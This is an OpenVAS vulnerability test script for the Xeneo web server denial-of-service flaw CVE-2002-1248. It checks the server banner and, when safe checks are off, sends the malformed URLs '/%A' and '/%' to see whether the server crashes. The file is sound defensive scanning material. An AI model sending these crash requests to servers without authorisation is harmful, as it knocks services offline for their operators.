# OpenVAS Vulnerability Test
# Description: Xeneo web server %A DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11546");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(6098);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-1248");
  script_name("Xeneo web server %A DoS");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Xeneo/banner");

  script_tag(name:"solution", value:"Upgrade to Xeneo 2.2.10 or later.");

  script_tag(name:"summary", value:"It was possible to crash the remote
  Xeneo web server by requesting a malformed URL ending
  with /%A or /%");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

b = get_http_banner(port:port);
if(!b || "Xeneo/" >!< b )
  exit(0);

if(safe_checks()) {
  # I got one banner: "Server: Xeneo/2.2"
  if(b =~ 'Server: *Xeneo/2\\.(([0-1][ \t\r\n.])|(2(\\.[0-9])?[ \t\r\n]))') {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

foreach item(make_list("/%A", "/%")) {

  data = http_get(item:item, port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
  soc = http_open_socket(port); # The server is supposed to be alive...
  if(!soc)
    exit(0); # Network glitch?
}

exit(99);